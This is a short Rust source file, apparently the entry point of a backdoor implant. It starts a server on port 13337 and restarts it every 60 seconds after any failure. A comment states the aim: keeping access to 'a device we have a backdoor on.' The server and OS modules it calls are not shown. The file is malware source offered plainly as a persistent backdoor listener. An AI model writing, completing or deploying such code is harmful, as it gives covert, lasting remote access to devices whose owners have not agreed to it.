use std::{thread, time};

mod communication;
pub mod os;

const RETRY_INTERVAL_SECONDS: u64 = 60;
const PORT: u32 = 13337;

fn main() {
    // Using loop here because in case we fail to create the server, we should try again.
    // This is because we don't want to lose access to a device we have a backdoor on.
    loop {
        // Blocking until server will die.
        match communication::server::run_server(PORT) {
            Ok(_) => (),
            Err(e) => {
                println!(
                    "Error {} when running server. Trying again in {} seconds.",
                    e, RETRY_INTERVAL_SECONDS
                );
            }
        }
        thread::sleep(time::Duration::from_secs(RETRY_INTERVAL_SECONDS));
    }
}
